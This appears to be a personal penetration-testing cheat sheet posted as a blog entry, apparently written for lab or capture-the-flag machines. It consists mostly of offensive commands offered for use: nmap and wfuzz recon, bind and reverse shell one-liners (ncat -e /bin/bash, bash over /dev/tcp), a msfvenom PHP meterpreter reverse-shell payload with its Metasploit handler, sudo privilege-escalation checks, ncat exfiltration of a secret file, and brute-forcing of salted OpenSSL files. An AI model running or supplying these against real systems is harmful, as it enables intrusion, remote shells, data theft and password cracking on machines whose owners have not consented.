---
layout: post
title: linux-commands
---

INFO: https://gracefulsecurity.com/path-traversal-cheat-sheet-linux/
recon: nmap -sC -sV -oA nmap ip

search exploit: searchsploit product
download exploit: searchsploit -x exploits/php/webapps/product.pl

Start Bind Shell on Victim: ncat -l -p 5555 -e "/bin/bash -i"
Connect to bind shell on attacker: ncat 10.10.5.24 5555
Listen for reverse shell on attacker: ncat -l -p 4444
Start reverse shell on victim: ncat -e "/bin/bash -i" 10.10.17.54
Start reverse shell with bash only on victim: bash -i &>/dev/tcp/10.10.10.25/42 0>&1
Upgrade to pseudo terminal: python -c 'import pty; pty.spawn("/bin/bash")'

nc -lvnp port

python -m SimpleHTTPServer port

https://gtfobins.github.io/
/usr/bin/sudo /usr/bin/journalctl -n5 -u

https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh

gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u IP -x php -t 15 -s 200,204,301,302,307,403
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -e -u IP
wfuzz -w /usr/share/wfuzz/wordlist/general/big.txt --hc '403,404' -u http://IP/FUZZ/file

gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.13.37.10
wfuzz -z file,/opt/seclists/Discovery/Web-Content/common.txt --hc 302,404 http://10.13.37.10/FUZZ
wfuzz -c -v --hc 400,404 -z file,/usr/share/wordlists/rockyou.txt -z file,/usr/share/wordlists
nmap -sC -sV -T3 --script vuln -p- --source-port 53 --spoof-mac cisco 10.13.37.10 -oA vuln-nmap -vv

wfuzz -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt  http://10.13.37.10/search?FUZZ=cmd
wfuzz -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh=178  http://10.13.37.10/search?FUZZ=cmd
wfuzz -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh=178  http://10.13.37.10/search?category=FUZZ

GTFOBINS
test: root -l:

pepe@lalalab:~$ sudo -l
[sudo] password for pepe: 
Sorry, user pepe may not run sudo on lalalab.

sudo -l
Matching Defaults entries for pepita on lalalab:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pepita may run the following commands on lalalab:
    (ALL) NOPASSWD: /bin/nano /opt/priv

msfvenom -p php/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f raw > payload.php
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST x.x.x.x
set LPORT 4444
meterpreter > search -d /home -f "*.txt"

en shell:
find / -iname *.txt

https://www.nicolashug.dev/post/memo-reverse-shell/
https://book.hacktricks.xyz/pentesting-web/web-tool-wfuzz
https://rmccarth.info/post/highlights/
http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html
https://github.com/DominicBreuker/pspy
https://peppoj.net/2012/09/how-to-send-and-receive-files-with-ncat-formerly-netcat/

    ncat The command in question
    -v Verbose output, recommended for testing
    -l Tells ncat to listen
    -k Tells ncat to keep the connection up (ncat exits on client disconnect by default)
    -n Tells ncat to skip DNS resolution (not necessary when connecting/listening on plain IP’s)
    –ssl Tells ncat to send data encrypted with ssl (optional)
    –send-only Tells ncat to only send data (optional)
    –recv-only Tells ncat to only receive data (optional)

Now, some examples

    [Server] $ncat -l 1025 > file.txt [Client] $cat file.txt | ncat [IP of Server] 1025 – Sends “file.txt” to the server over port 1025
    [Server] $ncat -lkv 12345 > file.txt [Client] $cat file.txt | ncat [IP of Server] 12345 – Sends “file.txt” to the server over port 12345. The server will verbosely print what is going on, and keep the connection open when the client disconnects
    [Server] $ncat -lkvn –recv-only 1337 > supersecretfile.txt [Client] $cat supersecretfile.txt | ncat –send-only –ssl [IP of Server] 1337 – Sends “supersecretfile.txt” to the server over port 1337. The server will verbosely print output, keep the connection open and skip resolving DNS. While the client sends the data encrypted over ssl

file nameoffile #get type of file = encrypted enc'd data with salted password
apt-get install bruteforce-salted-openssl 
bruteforce-salted-openssl -t 10 -f /usr/share/wordlist/rockyou.txt -c aes-256-cbc -d sha256 nameoffile


